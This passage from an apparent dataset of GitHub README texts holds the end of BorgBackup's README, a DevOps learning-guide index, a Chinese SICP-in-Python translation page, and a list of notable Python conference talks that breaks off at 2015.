RELEASE NUMBER\nCHANGES (like when going from 0.x.y to 1.0.0 or from 1.x.y to 2.0.0).\n\nNOT RELEASED DEVELOPMENT VERSIONS HAVE UNKNOWN COMPATIBILITY PROPERTIES.\n\nTHIS IS SOFTWARE IN DEVELOPMENT, DECIDE YOURSELF WHETHER IT FITS YOUR NEEDS.\n\nSecurity issues should be reported to the `Security contact`_ (or\nsee ``docs\/suppport.rst`` in the source distribution).\n\n.. start-badges\n\n|doc| |build| |coverage| |bestpractices| |bounties|\n\n.. |bounties| image:: https:\/\/api.bountysource.com\/badge\/team?team_id=78284&style=bounties_posted\n        :alt: Bounty Source\n        :target: https:\/\/www.bountysource.com\/teams\/borgbackup\n\n.. |doc| image:: https:\/\/readthedocs.org\/projects\/borgbackup\/badge\/?version=stable\n        :alt: Documentation\n        :target: https:\/\/borgbackup.readthedocs.org\/en\/stable\/\n\n.. |build| image:: https:\/\/api.travis-ci.org\/borgbackup\/borg.svg\n        :alt: Build Status\n        :target: https:\/\/travis-ci.org\/borgbackup\/borg\n\n.. |coverage| image:: https:\/\/codecov.io\/github\/borgbackup\/borg\/coverage.svg?branch=master\n        :alt: Test Coverage\n        :target: https:\/\/codecov.io\/github\/borgbackup\/borg?branch=master\n\n.. |screencast_basic| image:: https:\/\/asciinema.org\/a\/133292.png\n        :alt: BorgBackup Basic Usage\n        :target: https:\/\/asciinema.org\/a\/133292?autoplay=1&speed=1\n\n.. _installation: https:\/\/asciinema.org\/a\/133291?autoplay=1&speed=1\n\n.. _advanced usage: https:\/\/asciinema.org\/a\/133293?autoplay=1&speed=1\n\n.. |bestpractices| image:: https:\/\/bestpractices.coreinfrastructure.org\/projects\/271\/badge\n        :alt: Best Practices Score\n        :target: https:\/\/bestpractices.coreinfrastructure.org\/projects\/271\n\n.. end-badges\n"},{"repo":"\/Tikam02\/DevOps-Guide","language":"HTML","readme_contents":"\n\n![devops guide](https:\/\/github.com\/Tikam02\/DevOps-Guide\/blob\/master\/img\/devops-guide.png)\n\n![GitHub last commit](https:\/\/img.shields.io\/github\/last-commit\/Tikam02\/DevOps_Cheatsheet?style=for-the-badge)   ![Devops](https:\/\/img.shields.io\/badge\/Development-Operations-blue?style=for-the-badge) ![Subreddit subscribers](https:\/\/img.shields.io\/reddit\/subreddit-subscribers\/devops?style=for-the-badge) ![GitHub contributors](https:\/\/img.shields.io\/github\/contributors\/Tikam02\/DevOps-Guide?style=for-the-badge)\n\n<p>\n\t\t<a href=\"https:\/\/triplebyte.com\/a\/UEmYALe\/d\">\n\t\t<b>Looking for a job?<\/b> \n\t\t\t<br>\n\t\t\tNo resume needed. Just prove you can code. Take Triplebyte\u2019s quiz \n      and go straight to final onsite interviews!\n\t\t\t<br>\n\t\t\t<div>\n\t\t\t\t<img src=\"https:\/\/github.com\/Tikam02\/DevOps-Guide\/blob\/master\/img\/logo\/Triplebyte_Logo_Default.png\" width=\"500\" hieght=\"400\"  alt=\"Tripblebyte\" align=\"middle\">\n\t\t\t<\/div>\n\t\t<\/a>\n\t\t<!-- <sub><i>Clicking this helps fund the DevOps Guide project<\/i><\/sub> -->\n\t<\/p>\n\t\n\t\n\t\n*******************\n\n\n<center>\n<table>\n <tr>\n<td align=\"center\"><a href=\".\/Docker\"><img src=\"img\/docker.png\" width=\"75px;\" height=\"75px;\" alt=\"Docker\"\/><br\/><b>Docker<\/b><\/a><br \/><sub><a href=\".\/Docker\/docker-concepts.md\">Docker Concepts<\/a><\/sub><br><sub><a href=\".\/Docker\/docker-notes.md\">Docker Notes<\/a><\/sub><br><sub><a href=\".\/Docker\">Docker Tutorial<\/a><\/sub><\/td>\n     <td align=\"center\"><a href=\".\/kubernetes\"><img src=\"img\/logo\/kubernetes.png\" width=\"75px;\" height=\"75px;\" alt=\"kubernetes\"\/><br \/><b>Kubernetes<\/b><\/a><br \/><sub><a href=\".\/kubernetes\/kuber-concepts.md\">Kubernetes Concepts<\/a><\/sub><br><sub><a href=\".\/kubernetes\/kubernetes-commands.md\">Kubernetes Commands<\/a><\/sub><\/td>\n    <td align=\"center\"><a href=\".\/IaC\/Prometheus\"><img src=\"img\/logo\/prometheus.png\" width=\"75px;\" height=\"75px;\" alt=\"Prometheus\"\/><br \/><b>Prometheus<\/b><\/a><br \/><sub><a href=\".\/IaC\/Prometheus\/prometheus-concepts.md\">Prometheus Concepts<\/a><\/sub><br><sub><a href=\".\/IaC\/Prometheus\/prometheus-tutorials.md\">Prometheus Tutorial<\/a><\/sub><\/td>\n    <td align=\"center\"><a href=\".\/CI-CD\/git\"><img src=\"img\/logo\/git.png\" width=\"90px;\" height=\"75px;\" alt=\"Git\"\/><br \/><b>Git<\/b><\/a><br\/><sub><a href=\".\/CI-CD\/git\">Git concepts<\/a><\/sub><br><sub><a href=\".\/CI-CD\/git\/git-advanced.md\">Git Advanced<\/a><\/sub><\/td>\n    <td align=\"center\"><a href=\".\/IaC\/Ansible\"><img src=\"img\/logo\/ansible.png\" width=\"70px;\" height=\"75px;\" alt=\"Ansible\"\/><br \/><b>Ansible<\/b><\/a><br \/><sub><a href=\".\/IaC\/Ansible\/ansible-concepts.md\"> Ansible Concepts<\/a><\/sub><br><sub><a href=\".\/IaC\/Ansible\/ansible-tutorials.md\"> Ansible Tutorials<\/a><\/sub><\/td>\n    <td align=\"center\"><a href=\".\/IaC\/Terraform\"><img src=\"img\/logo\/terraform.png\" width=\"65px;\" height=\"75px;\" alt=\"Terraform\"\/><br \/><b>Terraform <\/b><\/a><br \/><sub><a href=\".\/IaC\/Terraform\/terraform-concepts.md\">Terraform Concepts<\/a><\/sub><br><sub><a href=\".\/IaC\/Terraform\/terraform-tutorials.md\"> Terraform Tutorials<\/a><\/sub><\/td>\n    <td align=\"center\"><a href=\".\/CI-CD\/jenkins\"><img src=\"img\/logo\/jenkins.png\" width=\"100x;\" height=\"75px;\" alt=\"Jenkins\"\/><br \/><b>Jenkins<\/b><\/a><br \/><sub><a href=\".\/CI-CD\/jenkins\/jenkins-concepts.md\">Jenkins Concepts<\/a><\/sub><br><sub><a href=\".\/CI-CD\/jenkins\/jenkins-tutorials.md\">Jenkins Tutorials<\/a><\/sub><\/td>\n  <\/tr>\n   \n   \n <\/table>\n<\/center>\n   \n<center>\n<table>\n\n   <tr>\n    <td align=\"center\"><a href=\".\/OS\"><img src=\"img\/logo\/linux.png\" width=\"75x;\" height=\"75px;\" alt=\"Linux\"\/><br \/><b>Linux<\/b><\/a><br \/><sub><a href=\".\/OS\/os-concepts.md\">OS\/Linux-Concepts<\/a><\/sub><br><sub><a href=\".\/OS\/os-commands.md\">Linux Commands<\/a><\/sub><\/td>\n     <td align=\"center\"><a href=\".\/Networking\"><img src=\"img\/logo\/network.png\" width=\"80x;\" height=\"75px;\" alt=\"Networking\"\/><br \/><b>Networking<\/b><\/a><br \/><sub><a href=\".\/Networking\/networking-concepts.md\">Networking Concepts<\/a><\/sub><br><sub><a href=\".\/Networking\/networking-commands.md\">Networking Commands<\/a><\/sub><\/td>\n    <td align=\"center\"><a href=\".\/Books\"><img src=\"img\/logo\/books.png\" width=\"80x;\" height=\"75px;\" alt=\"Books\"\/><br \/><b>Books<\/b><\/a><br \/><sub><\/td>\n    <td align=\"center\"><a href=\".\/Interview\"><img src=\"img\/logo\/interview.png\" width=\"80x;\" height=\"75px;\" alt=\"Interview\"\/><br \/><b>Interview <\/b><\/a><br \/><sub><a href=\".\/Interview\/Dev-ops-Interview.md\">Interview Questions<\/a><\/sub><\/td>\n    <td align=\"center\"><a href=\".\/CI-CD\/GitlabCi\"><img src=\"img\/logo\/gitlab.png\" width=\"80x;\" height=\"75px;\" alt=\"Gitlab\"\/><br \/><b>Gitlab<\/b><\/a><br \/><sub><a href=\".\/CI-CD\/GitlabCi\/gitlab-concepts.md\">Gitlab Concepts<\/a><\/sub><br><sub><a href=\".\/CI-CD\/GitlabCi\/gitlab-commands.md\">Gitlab Commands<\/a><\/sub><\/td>\n    <td align=\"center\"><a href=\".\/IaC\/Puppet\"><img src=\"img\/logo\/puppet.png\" width=\"100x;\" height=\"75px;\" alt=\"Puppet\"\/><br \/><b>Puppet<\/b><\/a><br \/><sub><a href=\".\/IaC\/Puppet\/puppet-concepts.md\">Puppet Concepts<\/a><\/sub><br><sub><a href=\".\/IaC\/Puppet\/puppet-commands.md\">Puppet Commands<\/a><\/sub><\/td>\n    <td align=\"center\"><a href=\".\/IaC\/Chef\"><img src=\"img\/logo\/chef.jpg\" width=\"80x;\" height=\"75px;\" alt=\"Chef\"\/><br \/><b>Chef<\/b><\/a><br \/><sub><a href=\".\/IaC\/Chef\/chef-concepts.md\">Chef Concepts<\/a><\/sub><br><sub><a href=\".\/IaC\/Chef\/chef-commands.md\">Chef Commands<\/a><\/sub><\/td>\n   \n  <\/tr>\n  \n <\/table>\n<\/center>\n\n <center>\n<table>\n\n   <tr>\n    <td align=\"center\"><a href=\".\/CI-CD\/TravisCi\"><img src=\"img\/logo\/travisci.png\" width=\"70x;\" height=\"75px;\" alt=\"Gitlab\"\/><br \/><b>Travis<\/b><\/a><br \/><sub><a href=\".\/CI-CD\/TravisCi\/travis-concepts.md\">Travis Concepts<\/a><\/sub><br><sub><a href=\".\/CI-CD\/TravisCi\/travis-commands.md\">Travis Commands<\/a><\/sub><\/td>\n   \n  <\/tr>\n  \n <\/table>\n<\/center>\n\n\n\n\n\n\n\n\n********************\n\n\n### Getting Started DevOps Links:\n\n- [What is Devops - AWS](https:\/\/aws.amazon.com\/devops\/what-is-devops\/)\n- [DevOps Roadmap by kamranahmedse](https:\/\/github.com\/kamranahmedse\/developer-roadmap\/blob\/master\/images\/devops.png)\n- [r\/devops](https:\/\/www.reddit.com\/r\/devops\/)\n- [IBM Kubernetes Handson Labs](https:\/\/github.com\/IBM\/kube101\/tree\/master\/workshop)\n- [Getting Started With Azure DevOps](https:\/\/github.com\/microsoft\/azuredevopslabs)\n- [Getting started with Google Cloud Platform](https:\/\/cloud.google.com\/gcp\/getting-started\/)\n- [Freecodecamp Devops Getting Started Articles](https:\/\/www.freecodecamp.org\/news\/tag\/devops\/)\n- [The-devops-roadmap-for-programmers](https:\/\/dzone.com\/articles\/the-devops-roadmap-for-programmers)\n- [Roadmap To devops](https:\/\/medium.com\/faun\/the-roadmap-to-become-a-devops-dude-from-server-to-serverless-dd97420f640e)\n- [DevOps Getting Started](https:\/\/medium.com\/@devfire\/how-to-become-a-devops-engineer-in-six-months-or-less-366097df7737)\n- [How-to-get-started-with-devops](https:\/\/dev.to\/liquid_chickens\/how-to-get-started-with-devops)\n- [Going-from-it-to-devops](https:\/\/medium.com\/better-programming\/going-from-it-to-devops-996192520331)\n  \n**************************\n## To Do\n\n- [ ] Add More Notes on OS\/Linux\n- [ ] Add more concepts of CI\/CD\n- [ ] Add more interview Question about OS and Networking\n- [ ] Kubernetes Monitoring - Prometheus and Grafana\n- [ ] Add IaC concepts and Tools\n- [ ] Add - AWS CloudFormation,Terraform,Chef,Ansible,Puppet\n\n**************************\n\n## Contributors \u2728\n\nThanks goes to these wonderful people ([emoji key](https:\/\/allcontributors.org\/docs\/en\/emoji-key)):\n\n<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->\n<!-- prettier-ignore -->\n<table>\n  <tr>\n    <td align=\"center\"><a href=\"http:\/\/www.ghostwheel.co.uk\"><img src=\"https:\/\/avatars0.githubusercontent.com\/u\/652579?v=4\" width=\"100px;\" alt=\"Neil Duncan\"\/><br \/><sub><b>Neil Duncan<\/b><\/sub><\/a><br \/><a href=\"https:\/\/github.com\/Tikam02\/DevOps-Guide\/commits?author=neilduncan\" title=\"Documentation\">\ud83d\udcd6<\/a><\/td>\n    <td align=\"center\"><a href=\"https:\/\/github.com\/cuzza0\"><img src=\"https:\/\/avatars0.githubusercontent.com\/u\/8264053?v=4\" width=\"100px;\" alt=\"cuzza0\"\/><br \/><sub><b>cuzza0<\/b><\/sub><\/a><br \/><a href=\"https:\/\/github.com\/Tikam02\/DevOps-Guide\/commits?author=cuzza0\" title=\"Documentation\">\ud83d\udcd6<\/a><\/td>\n    <td align=\"center\"><a href=\"https:\/\/adrianmoisey.gitlab.com\/\"><img src=\"https:\/\/avatars3.githubusercontent.com\/u\/736329?v=4\" width=\"100px;\" alt=\"Adrian Moisey\"\/><br \/><sub><b>Adrian Moisey<\/b><\/sub><\/a><br \/><a href=\"https:\/\/github.com\/Tikam02\/DevOps-Guide\/commits?author=adrianmoisey\" title=\"Documentation\">\ud83d\udcd6<\/a><\/td>\n    <td align=\"center\"><a href=\"https:\/\/github.com\/Win32Sector\"><img src=\"https:\/\/avatars3.githubusercontent.com\/u\/7781383?v=4\" width=\"100px;\" alt=\"Pavel Kozlov\"\/><br \/><sub><b>Pavel Kozlov<\/b><\/sub><\/a><br \/><a href=\"#question-Win32Sector\" title=\"Answering Questions\">\ud83d\udcac<\/a><\/td>\n    <td align=\"center\"><a href=\"https:\/\/github.com\/milap-neupane\"><img src=\"https:\/\/avatars0.githubusercontent.com\/u\/2145263?v=4\" width=\"100px;\" alt=\"Milap Neupane\"\/><br \/><sub><b>Milap Neupane<\/b><\/sub><\/a><br \/><a href=\"https:\/\/github.com\/Tikam02\/DevOps-Guide\/commits?author=milap-neupane\" title=\"Code\">\ud83d\udcbb<\/a> <a href=\"#tutorial-milap-neupane\" title=\"Tutorials\">\u2705<\/a><\/td>\n    <td align=\"center\"><a href=\"https:\/\/johnoctubre.me\/\"><img src=\"https:\/\/avatars0.githubusercontent.com\/u\/1725315?v=4\" width=\"100px;\" alt=\"john\"\/><br \/><sub><b>john<\/b><\/sub><\/a><br \/><a href=\"https:\/\/github.com\/Tikam02\/DevOps-Guide\/commits?author=johnoct\" title=\"Documentation\">\ud83d\udcd6<\/a><\/td>\n    <td align=\"center\"><a href=\"https:\/\/www.linkedin.com\/in\/jobin-george-364bbb127\/\"><img src=\"https:\/\/avatars0.githubusercontent.com\/u\/26024383?v=4\" width=\"100px;\" alt=\"Jobin George\"\/><br \/><sub><b>Jobin George<\/b><\/sub><\/a><br \/><a href=\"https:\/\/github.com\/Tikam02\/DevOps-Guide\/commits?author=jobintweets\" title=\"Documentation\">\ud83d\udcd6<\/a><\/td>\n  <\/tr>\n  <tr>\n    <td align=\"center\"><a href=\"https:\/\/github.com\/tsyr2ko\"><img src=\"https:\/\/avatars3.githubusercontent.com\/u\/344274?v=4\" width=\"100px;\" alt=\"tsyr2ko\"\/><br \/><sub><b>tsyr2ko<\/b><\/sub><\/a><br \/><a href=\"https:\/\/github.com\/Tikam02\/DevOps-Guide\/commits?author=tsyr2ko\" title=\"Documentation\">\ud83d\udcd6<\/a><\/td>\n    <td align=\"center\"><a href=\"https:\/\/twitter.com\/VictorNS69\"><img src=\"https:\/\/avatars2.githubusercontent.com\/u\/10101065?v=4\" width=\"100px;\" alt=\"V\u00edctor Nieves S\u00e1nchez\"\/><br \/><sub><b>V\u00edctor Nieves S\u00e1nchez<\/b><\/sub><\/a><br \/><a href=\"https:\/\/github.com\/Tikam02\/DevOps-Guide\/commits?author=VictorNS69\" title=\"Documentation\">\ud83d\udcd6<\/a><\/td>\n  <\/tr>\n<\/table>\n\n<!-- ALL-CONTRIBUTORS-LIST:END -->\n\nThis project follows the [all-contributors](https:\/\/github.com\/all-contributors\/all-contributors) specification. Contributions of any kind welcome!\n\n********************************************\n<a href=\"https:\/\/www.buymeacoffee.com\/95jwDkC\" target=\"_blank\"><img src=\"https:\/\/www.buymeacoffee.com\/assets\/img\/custom_images\/orange_img.png\" alt=\"Buy Me A Coffee\" style=\"height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;\" ><\/a>\n*********************************************\n## License\n\nThis project is licensed under the MIT License - Copyright (c) 2019 Tikam Alma\n"},{"repo":"\/wizardforcel\/sicp-py-zh","language":"CSS","readme_contents":"# SICP Python \u63cf\u8ff0 \u4e2d\u6587\u7248\n\n\u539f\u6587\uff1a[CS61A: Online Textbook](http:\/\/www-inst.eecs.berkeley.edu\/~cs61a\/sp12\/book\/)\n\n\u8bd1\u8005\uff1a[\u98de\u9f99](https:\/\/github.com\/wizardforcel)\n\n+ [\u5728\u7ebf\u9605\u8bfb](https:\/\/www.gitbook.com\/book\/wizardforcel\/sicp-py\/details)\n+ [PDF\u683c\u5f0f](https:\/\/www.gitbook.com\/download\/pdf\/book\/wizardforcel\/sicp-py)\n+ [EPUB\u683c\u5f0f](https:\/\/www.gitbook.com\/download\/epub\/book\/wizardforcel\/sicp-py)\n+ [MOBI\u683c\u5f0f](https:\/\/www.gitbook.com\/download\/mobi\/book\/wizardforcel\/sicp-py)\n+ [Github](https:\/\/github.com\/wizardforcel\/sicp-py-zh)\n\n## \u8d5e\u52a9\u6211\n\n![](img\/qr_alipay.png)\n\n## \u534f\u8bae\n\n[CC BY-NC-SA 4.0](http:\/\/creativecommons.org\/licenses\/by-nc-sa\/4.0\/)\n"},{"repo":"\/s16h\/py-must-watch","language":"HTML","readme_contents":"**The contents of this repo are now hosted at: [thehighlight.tv\/stajbakhsh\/py-must-watch](http:\/\/www.thehighlight.tv\/stajbakhsh\/py-must-watch)**\n\nMust-watch videos about Python\n=============\nInspired by [js-must-watch](https:\/\/github.com\/bolshchikov\/js-must-watch). Create pull requests to add more awesome links :-)\n\n## 2007\n* Alex Martelli: **Python Design Patterns** (Google Developers Day US)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=0vJJlVBVTFg) [00:44:02]\n    * [Slides](http:\/\/www.aleax.it\/gdd_pydp.pdf)\n\n* Thomas Wouters: **Advanced Python (or understanding Python)** (Google)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=uOzdG3lwcB4) [01:15:43]\n\n## 2009\n* David Beazley: **Inside the Python GIL**\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=ph374fJqFPE) [01:01:03]\n    * [Misc resources](http:\/\/www.dabeaz.com\/GIL\/)\n\n## 2010\n* Brandon Rhodes: **The Mighty Dictionary** (PyCon Atlanta)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=C4Kc8xzcA68) [00:30:50]\/[pyvideo](http:\/\/pyvideo.org\/video\/276\/the-mighty-dictionary-55)\n    * [Slides](http:\/\/rhodesmill.org\/brandon\/slides\/2010-03-pycon\/)\n* David Beazley: **Understanding the Python GIL** (PyCon US)\n    * Video: [youtube](http:\/\/www.youtube.com\/watch?v=Obt-vMVdM8s) [00:46:10]\/[pyvideo](http:\/\/pyvideo.org\/video\/353\/pycon-2010--understanding-the-python-gil---82)\n    * [Misc resources](http:\/\/www.dabeaz.com\/GIL\/)\n\n## 2011\n* Raymond Hettinger: **API Design: Lessons Learned** (PyCon US)\n    * [PyCon presentation](https:\/\/us.pycon.org\/2011\/schedule\/presentations\/263\/)\n    * Video: [youtube](http:\/\/www.youtube.com\/watch?v=heJuQWNdwJI) [01:17:34]\/[pyvideo](http:\/\/pyvideo.org\/video\/366\/pycon-2011--api-design--lessons-learned)\n\n## 2012\n* Brandon Rhodes: **Python Design Patterns 1** (PyCon US)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=Er5K_nR5lDQ) [01:07:50]\/[pyvideo](http:\/\/pyvideo.org\/video\/1369\/python-design-patterns-1)\n    * [Slides](http:\/\/rhodesmill.org\/brandon\/slides\/2012-07-pyohio\/)\n* Erik Rose: **Parsing Horrible Things with Python** (PyCon US)\n    * [PyCon presentation](https:\/\/us.pycon.org\/2012\/schedule\/presentation\/468\/)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=tCUdeLIj4hE) [00:30:31]\/[pyvideo](http:\/\/pyvideo.org\/video\/708\/parsing-horrible-things-with-python)\n* Jack Diederich: **Stop Writing Classes** (PyCon US)\n    * [PyCon presentation](https:\/\/us.pycon.org\/2012\/schedule\/presentation\/352\/)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=o9pEzgHorH0) [00:27:30]\/[pyvideo](http:\/\/pyvideo.org\/video\/880\/stop-writing-classes)\n* Ned Batchelder: **Pragmatic Unicode, or, How do I stop the pain?** (PyCon US)\n    * [PyCon presentation](https:\/\/us.pycon.org\/2012\/schedule\/presentation\/141\/)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=sgHbC6udIqc) [00:36:21]\/[pyvideo](http:\/\/pyvideo.org\/video\/948\/pragmatic-unicode-or-how-do-i-stop-the-pain)\n    * [Slides with text](http:\/\/nedbatchelder.com\/text\/unipain.html)\/[Just the slides](http:\/\/nedbatchelder.com\/text\/unipain\/unipain.html)\n* Peter Inglesby: **Discovering Descriptors** (EuroPython)\n    * [EuroPython presentation](https:\/\/ep2013.europython.eu\/conference\/talks\/discovering-descriptors)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=D3-NZXHO5QI) [00:37:51]\n    * [Code](https:\/\/github.com\/inglesp\/Discovering-Descriptors)\n* Raymond Hettinger: **The Art of Subclassing** (PyCon US)\n    * [PyCon presentation](https:\/\/us.pycon.org\/2012\/schedule\/presentation\/399\/)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=miGolgp9xq8) [00:39:48]\/[pyvideo](http:\/\/pyvideo.org\/video\/879\/the-art-of-subclassing)\n* David Schachter: **How to Speed up a Python Program 114,000 times** (SF Python Usergroup)\n    * [Presentation](https:\/\/us.pycon.org\/2012\/schedule\/presentation\/399\/)\n    * [Slides](http:\/\/davidschachter.com\/ds\/SF_Python_Meetup_slides_public.pdf)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=e08kOj2kISU) [00:59:11]\n\n## 2013\n* David Beazley: **Python 3 Metaprogramming** (PyCon US)\n    * [PyCon presentation](https:\/\/us.pycon.org\/2013\/schedule\/presentation\/7\/)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=sPiWg5jSoZI) [03:24:00]\/[pyvideo](http:\/\/pyvideo.org\/video\/1716\/python-3-metaprogramming)\n    * [Misc resources](http:\/\/www.dabeaz.com\/py3meta\/)\n* Jessica McKellar: **The Future of Python - A Choose Your Own Adventure**\n    * Video [youtube](https:\/\/www.youtube.com\/watch?v=d1a4Jbjc-vU) [00:35:33]\/[pyvideo](http:\/\/pyvideo.org\/video\/2375\/the-future-of-python-a-choose-your-own-adventur)\n    * [Slides](https:\/\/speakerdeck.com\/nzpug\/jessica-mckellar-the-future-of-python-a-choose-your-own-adventure-keynote)\n* Kenneth Reitz: **Python for Humans** (PyCon US)\n    * Video: [youtube](http:\/\/www.youtube.com\/watch?v=QpkHt1hDYTo) [00:31:43]\/[pyvideo](http:\/\/pyvideo.org\/video\/1785\/python-for-humans-1)\n    * [Slides](https:\/\/speakerdeck.com\/pyconslides\/python-for-humans)\n* Ned Batchelder: **Loop like a native: while, for, iterators, generators** (PyCon US)\n    * [PyCon presentation](https:\/\/us.pycon.org\/2013\/schedule\/presentation\/76\/)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=EnSu9hHGq5o) [00:29:15]\/[pyvideo](http:\/\/pyvideo.org\/video\/1758\/loop-like-a-native-while-for-iterators-genera)\n    * [Slides with text](http:\/\/nedbatchelder.com\/text\/iter.html)\/[Just the slides](http:\/\/nedbatchelder.com\/text\/iter\/iter.html)\n* Raymond Hettinger: **Python's Class Development Toolkit** (PyCon US)\n    * [PyCon presentation](https:\/\/us.pycon.org\/2013\/schedule\/presentation\/125\/)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=HTLu2DFOdTg) [00:45:56]\/[pyvideo](http:\/\/pyvideo.org\/video\/1779\/pythons-class-development-toolkit)\n    * [Slides](https:\/\/speakerdeck.com\/pyconslides\/pythons-class-development-toolkit-by-raymond-hettinger)\n* Raymond Hettinger: **Transforming Code into Beautiful, Idiomatic Python** (PyCon US)\n    * [PyCon presentation](https:\/\/us.pycon.org\/2013\/schedule\/presentation\/126\/)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=OSGv2VnC0go) [00:48:51]\/[pyvideo](http:\/\/pyvideo.org\/video\/1780\/transforming-code-into-beautiful-idiomatic-python)\n    * [Slides](https:\/\/speakerdeck.com\/pyconslides\/transforming-code-into-beautiful-idiomatic-python-by-raymond-hettinger-1)\n\n## 2014\n* Alex Gaynor: **Fast Python, Slow Python** (PyCon US)\n    * [PyCon presentation](https:\/\/us.pycon.org\/2014\/schedule\/presentation\/197\/)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=7eeEf_rAJds) [00:36:11]\/[pyvideo](http:\/\/pyvideo.org\/video\/2627\/fast-python-slow-python)\n    * [Slides](https:\/\/speakerdeck.com\/pycon2014\/fast-python-slow-python-by-alex-gaynor)\n* A. Jesse Jiryu Davis: **What Is Async, How Does It Work, And When Should I Use It?** (PyCon US)\n   * [PyCon presentation](https:\/\/us.pycon.org\/2014\/schedule\/presentation\/284\/)\n   * Video: [youtube](https:\/\/www.youtube.com\/watch?v=9WV7juNmyE8) [00:46:50]\/[pyvideo](http:\/\/pyvideo.org\/video\/2565\/what-is-async-how-does-it-work-and-when-should)\n   * [Slides](https:\/\/speakerdeck.com\/pycon2014\/what-is-async-how-does-it-work-and-when-should-i-use-it-by-a-jesse-jiryu-davis)\n* Benjamin Peterson: **Garbage Collection in Python** (PyCon US)\n    * [PyCon presentation](https:\/\/us.pycon.org\/2014\/schedule\/presentation\/153\/)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=iHVs_HkjdmI) [00:26:57]\/[pyvideo](http:\/\/pyvideo.org\/video\/2633\/garbage-collection-in-python)\n    * [Slides](https:\/\/speakerdeck.com\/pycon2014\/garbage-collection-in-python-by-benjamin-peterson)\n* Brandon Rhodes: **All Your Ducks In A Row: Data Structures in the Standard Library and Beyond** (PyCon US)\n    * [PyCon presentation](https:\/\/us.pycon.org\/2014\/schedule\/presentation\/211\/)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=fYlnfvKVDoM) [00:37:41]\/[pyvideo](http:\/\/pyvideo.org\/video\/2571\/all-your-ducks-in-a-row-data-structures-in-the-s)\n    * [Slides](http:\/\/rhodesmill.org\/brandon\/slides\/2014-04-pycon\/data-structures\/)\n* Brandon Rhodes: **The Clean Architecture** (PyOhio)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=DJtef410XaM) [00:49:54]\/[pyvideo](http:\/\/pyvideo.org\/video\/2840\/the-clean-architecture-in-python)\n    * [Slides](http:\/\/rhodesmill.org\/brandon\/slides\/2014-07-pyohio\/clean-architecture\/)\n* Christine Spang: **Subprocess to FFI: Memory, Performance, and Why You Shouldn't Shell** (PyCon US)\n    * [PyCon presentation](https:\/\/us.pycon.org\/2014\/schedule\/presentation\/190\/)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=YAO7PUZvVPw) [00:35:13]\/[pyvideo](http:\/\/pyvideo.org\/video\/2640\/subprocess-to-ffi-memory-performance-and-why-y)\n    * [Slides](https:\/\/speakerdeck.com\/pycon2014\/subprocess-to-ffi-by-christine-spang)\n* David Beazley: **Generators: The Final Frontier** (PyCon US)\n    * [PyCon presentation](https:\/\/us.pycon.org\/2014\/schedule\/presentation\/70\/)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=5-qadlG7tWo) [02:55:36]\/[pyvideo](http:\/\/pyvideo.org\/video\/2575\/generators-the-final-frontier)\n    * [Slides](http:\/\/fr.slideshare.net\/dabeaz\/generators-the-final-frontier)\n* Erik Rose: **Designing Poetic APIs** (PyCon US)\n    * [PyCon presentation](https:\/\/us.pycon.org\/2014\/schedule\/presentation\/207\/)\n    * Video: [youtube](http:\/\/www.youtube.com\/watch?v=JQYnFyG7A8c) [00:48:08]\/[pyvideo](http:\/\/pyvideo.org\/video\/2647\/designing-poetic-apis)\/[vod](http:\/\/vod.com.ng\/en\/video\/JQYnFyG7A8c\/Erik-Rose-Designing-Poetic-APIs-PyCon-2014)\n    * [Slides](https:\/\/speakerdeck.com\/pycon2014\/designing-poetic-apis-by-erik-rose)\n* Guido van Rossum: **Tulip: Async I\/O for Python 3** (PyCon US)\n    * [PyCon presentation](https:\/\/us.pycon.org\/2014\/schedule\/presentation\/284\/)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=1coLC-MUCJc) [01:10:38]\n* Mike M\u00fcller: **Faster Python Programs through Optimization** (PyCon US)\n    * [PyCon presentation](https:\/\/us.pycon.org\/2014\/schedule\/presentation\/71\/)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=wNBJDpyRm8w) [02:59:54]\/[pyvideo](http:\/\/pyvideo.org\/video\/607\/faster-python-programs-through-optimization)\n    * [Slides](http:\/\/fr.slideshare.net\/PyData\/faster-python-programs-through-optimization-mike-muller)\n* Ned Batchelder: **Getting Started Testing** (PyCon US)\n    * [PyCon presentation](https:\/\/us.pycon.org\/2014\/schedule\/presentation\/150\/)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=FxSsnHeWQBY) [00:42:44]\/[pyvideo](http:\/\/pyvideo.org\/video\/2674\/getting-started-testing)\n    * [Slides](https:\/\/speakerdeck.com\/pycon2014\/getting-started-testing-by-ned-batchelder)\n* S Anand: **Faster data processing in Python** (PyCon IN)\n    * [PyCon presentation](http:\/\/in.pycon.org\/funnel\/2014\/165-faster-data-processing-in-python)\n    * Video: [youtube](https:\/\/www.youtube.com\/watch?v=ylBslijJexw) [00:55:08]\n    * [iPython Notebook](http:\/\/nbviewer.ipython.org\/github\/sanand0\/ipython-notebooks\/blob\/master\/Faster%20Data%20Processing%20in%20Python.ipynb)\n\n## 2015\n* Raymond Hettinger: **Beyond PEP 8 -- Best practices for beautiful intelligible code** (PyCon US)\n    * [PyCon 